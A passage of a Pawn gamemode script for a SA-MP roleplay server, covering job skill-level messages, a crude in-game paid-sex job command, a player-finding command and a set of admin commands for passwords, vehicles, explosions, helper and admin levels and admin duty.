			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 2."); format(string, sizeof(string), "You need to sell %d more gun(s) to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 3."); format(string, sizeof(string), "You need to sell %d more gun(s) to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 4."); format(string, sizeof(string), "You need to sell %d more gun(s) to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill Level = 5."); }
		}
		case 7://Car Mechanic
		{
			new level = PlayerInfo[playerid][pMechSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 1."); format(string, sizeof(string), "You need to fix a car for %d time(s) more to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 2."); format(string, sizeof(string), "You need to fix a car for %d time(s) more to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 3."); format(string, sizeof(string), "You need to fix a car for %d time(s) more to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 4."); format(string, sizeof(string), "You need to fix a car for %d time(s) more to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Mechanic Skill Level = 5."); }
		}
		case 8://Boxer
		{
			new level = PlayerInfo[playerid][pBoxSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Boxing Skill Level = 1."); format(string, sizeof(string), "You need to Win %d more match(es) to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Boxing Skill Level = 2."); format(string, sizeof(string), "You need to Win %d more match(es) to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Boxing Skill Level = 3."); format(string, sizeof(string), "You need to Win %d more match(es) to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Boxing Skill Level = 4."); format(string, sizeof(string), "You need to Win %d more match(es) to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Boxing Skill Level = 5."); }
		}
		case 9://Fishing
		{
			new level = PlayerInfo[playerid][pFishSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Fishing Skill Level = 1."); format(string, sizeof(string), "You need to Fish %d more fish(es) to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Fishing Skill Level = 2."); format(string, sizeof(string), "You need to Fish %d more fish(es) to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Fishing Skill Level = 3."); format(string, sizeof(string), "You need to Fish %d more fish(es) to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Fishing Skill Level = 4."); format(string, sizeof(string), "You need to Fish %d more fish(es) to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Fishing Skill Level = 5."); }
		}
		case 10://Trucker
		{
			new level = PlayerInfo[playerid][pTruckSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Trucker Skill Level = 1."); format(string, sizeof(string), "You need to transport goods %d times to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Trucker Skill Level = 2."); format(string, sizeof(string), "You need to transport goods %d times to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Trucker Skill Level = 3."); format(string, sizeof(string), "You need to transport goods %d times to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Trucker Skill Level = 4."); format(string, sizeof(string), "You need to transport goods %d times to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Trucker Skill Level = 5."); }
		}
		case 11://Car Jacker
		{
			new level = PlayerInfo[playerid][pCarSkill], string[128];
			if(level >= 0 && level < 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 1."); format(string, sizeof(string), "You need to deliver %d more car(s) to level up.",50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 50 && level < 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 2."); format(string, sizeof(string), "You need to deliver %d more car(s) to level up.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 100 && level < 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 3."); format(string, sizeof(string), "You need to deliver %d more car(s) to level up.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 200 && level < 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 4."); format(string, sizeof(string), "You need to deliver %d more car(s) to level up.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Car Jacker Skill Level = 5."); }
		}
		/*case 12:// Craftsman
		{
			new level = PlayerInfo[playerid][pCraftSkill], string[128];
			if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 1."); format(string, sizeof(string), "You need to craft %d more items to level up.", 51 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 51 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 2."); format(string, sizeof(string), "You need to craft %d more items to level up.", 101 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 101 && level <= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 3."); format(string, sizeof(string), "You need to craft %d more items to level up.", 201 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 201 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 4."); format(string, sizeof(string), "You need to craft %d more items to level up.", 401 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			else if(level >= 401) { SendClientMessage(playerid, COLOR_YELLOW, "Your Craftsman Skill Level = 5."); }
		}*/
		default:
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid skill number specified.");
		}
	}
	return 1;
}

CMD:sex(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] == 3 || PlayerInfo[playerid][pJob2] == 3)
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "   You can only have Sex in a Car!");
			return 1;
		}
		new Car = GetPlayerVehicleID(playerid);

		new string[128], giveplayerid, money;
		if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sex [playerid/partofname] [price]");

		if(money < 1 || money > 10000) { SendClientMessage(playerid, COLOR_GREY, "   Price not lower then $1 or above $10,000!"); return 1; }
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
					if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't have Sex with yourself!"); return 1; }
					if(IsPlayerInAnyVehicle(playerid) && IsPlayerInVehicle(giveplayerid, Car))
					{
						if(PlayerInfo[playerid][pSexTime] < 1)
						{
							format(string, sizeof(string), "* You Offered %s to have Sex with you, for $%d.", GetPlayerNameEx(giveplayerid), money);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* Whore %s has Offered you to have Sex with them, for $%d (type /accept sex) to accept.", GetPlayerNameEx(playerid), money);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							SexOffer[giveplayerid] = playerid;
							SexPrice[giveplayerid] = money;
							PlayerInfo[playerid][pSexTime] = 60;
						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAD2, " You have already had sex, wait for your reload time to finish!");
							return 1;
						}
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   You or the other player must be in a Car together!");
						return 1;
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a Whore!");
	}
	return 1;
}

CMD:find(playerid, params[]) {
	if(PlayerInfo[playerid][pJob] != 1 && PlayerInfo[playerid][pJob2] != 1) {
		SendClientMessage(playerid, COLOR_GREY, "You're not a detective.");
	}
	else if(UsedFind[playerid]) {
		SendClientMessage(playerid, COLOR_GREY, "You've already searched for someone - wait a little.");
	}
	else {

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /find [playerid/partofname]");
		}
		else if(iTargetID == playerid) {
			SendClientMessage(playerid, COLOR_GREY, "You can't use this command on yourself.");
		}
		else if(!IsPlayerConnected(iTargetID)) {
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
		}
		else if(GetPlayerInterior(iTargetID) != 0) {
			SendClientMessage(playerid, COLOR_GREY, "That person is inside an interior.");
		}
		else if(PlayerInfo[iTargetID][pAdmin] >= 1 && AdminDuty[iTargetID] == 1) {
			SendClientMessage(playerid, COLOR_GREY, "You're unable to find this person.");
		}
		else {

			switch(PlayerInfo[playerid][pDetSkill]) {
				case 0 .. 49: {
					FindTimePoints[playerid] = 4;
					UsedFind[playerid] = 120;
				}
				case 50 .. 99: {
					FindTimePoints[playerid] = 6;
					UsedFind[playerid] = 90;
				}
				case 100 .. 199: {
					FindTimePoints[playerid] = 8;
					UsedFind[playerid] = 60;
				}
				case 200 .. 399: {
					FindTimePoints[playerid] = 10;
					UsedFind[playerid] = 30;
				}
				default: {
					FindTimePoints[playerid] = 12;
					UsedFind[playerid] = 15;
				}
			}

			new
				szZone[MAX_ZONE_NAME],
				szMessage[108];

			SetPlayerMarkerForPlayer(playerid, iTargetID, FIND_COLOR);
			GetPlayer3DZone(iTargetID, szZone, sizeof(szZone));
			format(szMessage, sizeof(szMessage), "%s has been last seen at %s.", GetPlayerNameEx(iTargetID), szZone);
			SendClientMessage(playerid, COLOR_GRAD2, szMessage);
			FindingPlayer[playerid]=iTargetID;
			FindTime[playerid] = 1;

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pDetSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
					PlayerInfo[playerid][pDetSkill]++;
				}
			#else
				PlayerInfo[playerid][pDetSkill]++;
			#endif

			switch(PlayerInfo[playerid][pDetSkill]) {
				case 50: SendClientMessage(playerid, COLOR_YELLOW, "* Your Detective Skill is now Level 2, you can find a little faster.");
				case 100: SendClientMessage(playerid, COLOR_YELLOW, "* Your Detective Skill is now Level 3, you can find a little faster.");
				case 200: SendClientMessage(playerid, COLOR_YELLOW, "* Your Detective Skill is now Level 4, you can find a little faster.");
				case 400: SendClientMessage(playerid, COLOR_YELLOW, "* Your Detective Skill is now Level 5, you can find a little faster.");
			}
		}
	}
	return 1;
}

CMD:changeuserpassword(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] < 5)
        return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

   	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
   		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

    new
		string[128],
		accountName[24],
		szPassword[64],
		password[64];

    if(sscanf(params, "s[MAX_PLAYER_NAME]s[64]", accountName, password))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /changeuserpassword [playername] [new password]");

	mysql_escape_string(accountName, accountName,MAX_PLAYER_NAME,sqldb);
	mysql_escape_string(password, szPassword,64,sqldb);

	SetPVarString(playerid, "opasschange", szPassword);
	SetPVarString(playerid, "opasschangetarget", accountName);

	mysql_format(sqldb,string, sizeof(string), "SELECT Username FROM players WHERE Username = '%s' AND AdminLevel = 0", accountName);
	mysql_tquery(sqldb,string,"OnQueryFinished","ii",THREAD_CHECK_NAME_PASSWORD,playerid);
    return 1;
}


CMD:changepass(playerid, params[]) {
	if(gPlayerLogged[playerid])
		ShowPlayerDialogEx(playerid, 2398, DIALOG_STYLE_INPUT, "Password Change", "Please enter your new password:", "Change", "Cancel");

	return 1;
}

CMD:givenos(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givenos [playerid/partofname]");

		if(!IsPlayerConnected(giveplayerid))
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
			return 1;
		}
		if(IsPlayerInAnyVehicle(giveplayerid))
		{
			new VehicleID = GetPlayerVehicleID(giveplayerid), Model = GetVehicleModel(VehicleID);
			switch(Model)
			{
			case 448,461,462,463,468,471,509,510,521,522,523,581,586,449: return
				SendClientMessage(playerid,COLOR_GRAD1,"You can't tune this vehicle!");
			}
			AddVehicleComponent(VehicleID, 1010); PlayerPlaySound(giveplayerid,1133,0.0,0.0,0.0); //NOS
			format(string, sizeof(string), "Successfully added NOS to %s's vehicle.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid,COLOR_GRAD1,string);
		}
		else
		{
			SendClientMessage(playerid,COLOR_GRAD1,"Player must be in a vehicle.");
		}
	}
	else
	{
		SendClientMessage(playerid,COLOR_GRAD1,"You're not authorized to use that command!");
	}
	return 1;
}

CMD:blowup(playerid, params[])
{
	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /blowup [playerid/partofname]");

	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		if(IsPlayerConnected(giveplayerid))
		{
				format(string, sizeof(string), "You have successfuly exploded %s (ID: %d).",GetPlayerNameEx(giveplayerid),giveplayerid);
				SendClientMessage(playerid,COLOR_GRAD2,string);
				new Float:boomx, Float:boomy, Float:boomz;
				GetPlayerPos(giveplayerid,boomx, boomy, boomz);
				CreateExplosion(boomx, boomy , boomz, 7, 1);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:oldcar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128];
		format(string, sizeof(string), "Your last driven vehicle ID was %d.",gLastCar[playerid]);
		SendClientMessage(playerid, COLOR_GREY, string);
	}
	return 1;
}

CMD:gotocar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new carid;
		if(sscanf(params, "d", carid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gotocar [carid]");

		new Float:cwx2,Float:cwy2,Float:cwz2;
		GetVehiclePos(carid, cwx2, cwy2, cwz2);
		if(GetPlayerState(playerid) == 2)
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePos(tmpcar, cwx2, cwy2, cwz2);
			TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			fVehSpeed[playerid] = 0.0;
		}
		else
		{
			SetPlayerPos(playerid, cwx2, cwy2, cwz2);
		}
		new string[128];
		format(string, sizeof(string), "You have teleported to vehicle ID %d.", carid);
		SendClientMessage(playerid, COLOR_GRAD1, string);
		SetPlayerInterior(playerid,0);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:getcar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new carid;
		if(sscanf(params, "d", carid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /getcar [carid]");
		new Float:plocx,Float:plocy,Float:plocz;

		GetPlayerPos(playerid, plocx, plocy, plocz);
		SetVehiclePos(carid,plocx,plocy+4, plocz);
		SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));
		LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		new string[128];
		format(string, sizeof(string), "You have teleported vehicle ID %d to yourself.", carid);
		SendClientMessage(playerid, COLOR_GRAD1, string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:sethelper(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4) {
		new
			iLevel,
			iTarget;

		if(sscanf(params, "ud", iTarget, iLevel))
			return SendClientMessage(playerid, COLOR_GREY, "USAGE: /sethelper [playerid/partofname] [level]");

		if(iLevel <= -1 || iLevel >= 3)
		    return SendClientMessage(playerid, COLOR_GREY, "Valid helper levels start from 1 and end at 2.");

		if(iTarget != INVALID_PLAYER_ID) {
		    if(PlayerInfo[iTarget][pAdmin] > 0)
		        return SendClientMessage(playerid, COLOR_GREY, "You can't make an admin a helper.");

			if(iLevel >= 2 && PlayerInfo[playerid][pAdmin] < 5)
			    return SendClientMessage(playerid, COLOR_GREY, "You must be a Level 5+ Admin to give someone Senior Helper status.");

			PlayerInfo[iTarget][pHelper] = iLevel;

			new
			    szMessage[64];


			if(PlayerInfo[iTarget][pAcceptReport] > 0)
			    PlayerInfo[iTarget][pAcceptReport] = 0;

			format(szMessage, sizeof(szMessage), "You have made %s a level %d helper.", GetPlayerNameEx(iTarget), iLevel);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			format(szMessage, sizeof(szMessage), "%s has made you a level %d helper.", GetPlayerNameEx(playerid), iLevel);
			SendClientMessage(iTarget, COLOR_WHITE, szMessage);
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:setadmin(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		new
			iAdminValue,
			iTargetID;

		if(sscanf(params, "ui", iTargetID, iAdminValue))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setadmin [playerid/partofname] [level]");
		}
		else if(IsPlayerConnected(iTargetID))
		{
			if(AdminDuty[iTargetID] != 0)
			{
		    	SendClientMessage(playerid, COLOR_WHITE, "That admin is currently on-duty. They must go off-duty in order for you to set their admin level.");
		    	return 1;
			}
			new szMessage[47 + (MAX_PLAYER_NAME * 2)];

			format(szMessage, sizeof(szMessage), "AdmCmd: %s has set %s to Level %d Admin.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID), iAdminValue);
			ABroadCast(COLOR_LIGHTRED,szMessage, 1);
			PlayerInfo[iTargetID][pAdmin] = iAdminValue;
			format(szMessage, sizeof(szMessage), "You have been set to Level %d Admin by %s.", iAdminValue, GetPlayerNameEx(playerid));
			SendClientMessage(iTargetID, COLOR_LIGHTBLUE, szMessage);

			if(PlayerInfo[iTargetID][pHelper] >= 1) {
			    PlayerInfo[iTargetID][pHelper] = 0;
			    PlayerInfo[iTargetID][pAcceptReport] = 0;
			}

			if(iAdminValue == 0)
			{
                format(PlayerInfo[iTargetID][pAdminName], MAX_PLAYER_NAME, "0");
			}
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:setadminname(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		/*if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }*/

		new giveplayerid, name[32];
		if(sscanf(params, "us[32]", giveplayerid, name))
		{
            SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setadminname [playerid/partofname] [name]");
            return 1;
		}

		if(PlayerInfo[giveplayerid][pAdmin] < 1)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "The player is not an admin.");
		    return 1;
		}

		if(AdminDuty[giveplayerid] != 0)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "That admin is currently on-duty. They must go off-duty in order for you to set their admin name.");
		    return 1;
		}

		new length = strlen(name);
		if(length < 3 || length > 20)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "The name can't less than 3 characters or more than 20 characters.");
		    return 1;
		}

		if(strfind(name, "_", true) != -1)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "The admin name must be one name. There can't be an underscore in the name.");
		    return 1;
		}

		if(strcmp(name, "Zhao", true) == 0 && PlayerInfo[playerid][pAdmin] < 6) {
		    SendClientMessage(playerid, COLOR_WHITE, "stop ! im zao ! you're not zao !");
			return 1;
		}

		new string[128];
		format(string, sizeof(string), "AdmCmd: %s has set %s's admin name to '%s'.", GetPlayerNameEx(playerid),  GetPlayerNameEx(giveplayerid), name);
		ABroadCast(COLOR_LIGHTRED, string, 1);

        format(PlayerInfo[giveplayerid][pAdminName], 32, name);
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:adminduty(playerid, params[]) {
	return cmd_aduty(playerid, params);
}

CMD:reportsold(playerid, params[]) {
	return cmd_reports(playerid, params);
}

CMD:aduty(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(strlen(PlayerInfo[playerid][pAdminName]) > 2 && strlen(PlayerInfo[playerid][pAdminName]) < 20) {
		    new
				string[128];

 			if(AdminDuty[playerid] != 0) {
				if(GetPlayerState(playerid) == PLAYER_STATE_WASTED)
				    return SendClientMessage(playerid, COLOR_GRAD2, "You can't do this while wasted.");

				ResetPlayerWeapons(playerid);
				SetPlayerArmedWeapon(playerid, 0);

				if(Spectating[playerid] > 0 && PlayerInfo[playerid][pAdmin] >= 2) {
					GettingSpectated[Spectate[playerid]] = 999;
					Spectating[playerid] = 0;
					Spectate[playerid] = 999;
					SetPVarInt(playerid, "SpecOff", 1);
					TogglePlayerSpectating(playerid, false);
					SetCameraBehindPlayer(playerid);
				}

				if(MP3Station[playerid] != 0) {
					MP3Station[playerid] = 0;
					StopAudioStreamForPlayer(playerid);
				}

				SetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
				SetPlayerArmourEx(playerid, PlayerInfo[playerid][pArmor]);

 				format(string, sizeof(string), "%s (ID %d - %s) is now off-duty as a Level %d Admin.", PlayerInfo[playerid][pAdminName], playerid, GetPlayerNameEx(playerid), PlayerInfo[playerid][pAdmin]);
 				ABroadCast(COLOR_WHITE, string, 1);

   				if(PlayerInfo[playerid][pAdmin] == 1) {
					SendClientMessage(playerid, COLOR_YELLOW, "You're now off-duty as admin, but still have access to your Level 1 Admin commands.");
				} else if(PlayerInfo[playerid][pAdmin] > 1 && PlayerInfo[playerid][pAdmin] < 6) {
					SendClientMessage(playerid, COLOR_YELLOW, "You're now off-duty as admin, and only have access to /admins /check /jail /ban /sban /kick /skick /showflags /reports /nrn");
				} else if(PlayerInfo[playerid][pAdmin] == 6) {
					SendClientMessage(playerid, COLOR_YELLOW, "You're now off-duty as admin, but still have access to all of your commands since you're a Level 6 Admin.");
				} else { }

				SendClientMessage(playerid, COLOR_REALRED, "Please remember to turn off any hacks you may have (press F12 to disable s0beit).");

				ResetPlayerVariables(playerid);
				AttemptPlayerLogin(playerid, AdminRelogPassword[playerid]);
 			}
 			else
 			{
 				PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
				PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
				GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
				GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
				GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				GetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
				GetPlayerArmour(playerid, PlayerInfo[playerid][pArmor]);
				SaveAccount(playerid);

				if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject]))
				{
					DestroyDynamicObject(PlayerInfo[playerid][pWeedObject]);
				}

 			    PhoneOnline[playerid] = 1;

				for(new i = 0; i < MAX_REPORTS; i++)
				{
	    			if(Reports[i][ReportFrom] == playerid)
	    			{
	        			Reports[i][ReportFrom] = 999;
						Reports[i][BeingUsed] = 0;
						Reports[i][TimeToExpire] = 0;
					}
				}

				if(GotHit[playerid] > 0)
				{
					if(GetChased[playerid] < 999)
					{
						if(IsPlayerConnected(GetChased[playerid]))
						{
							SendClientMessage(GetChased[playerid], COLOR_YELLOW, "Your hit has left the server.");
							GoChase[GetChased[playerid]] = 999;
						}
					}
				}
 				if(GoChase[playerid] < 999)
 				{
      				GetChased[GoChase[playerid]] = 999;
      				GotHit[GoChase[playerid]] = 999;
 				}

				SetPVarInt(playerid, "TempName", 1);
				new username[MAX_PLAYER_NAME];
				GetPlayerName(playerid, username, sizeof(username));
				SetPVarString(playerid, "TempNameName", username);

 		    	AdminDuty[playerid] = 1;
 		    	format(string, sizeof(string), "%s (ID %d - %s) is now on-duty as a Level %d Admin.",PlayerInfo[playerid][pAdminName], playerid, GetPlayerNameEx(playerid), PlayerInfo[playerid][pAdmin]);
 		    	ABroadCast(COLOR_WHITE, string, 1);
 		    	SendClientMessage(playerid, COLOR_YELLOW, "You're now on-duty as admin and have access to all your commands, see /ah.");

				SetPlayerName(playerid, PlayerInfo[playerid][pAdminName]);
 			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "You need an admin name to go on-duty. Contact a Level 5+ Admin to have your admin name set.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:forcesave(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
        SaveHouses();
        SendClientMessage(playerid, COLOR_YELLOW, "All houses updated sucessfully.");
		foreach(Player, i)
		{
		    if(GetPVarInt(i, "TempName") != 1 && gPlayerLogged[i] && GetPVarInt(i, "PBM") == 0 && GetPVarInt(i, "EventToken") == 0 && AdminDuty[i] == 0)
			{
				PlayerInfo[i][pInt] = GetPlayerInterior(i);
				new Float: fArmour;
				if(GetPVarType(i, "tabbedVW") != 0) {
					PlayerInfo[i][pVW] = GetPVarInt(i, "tabbedVW");
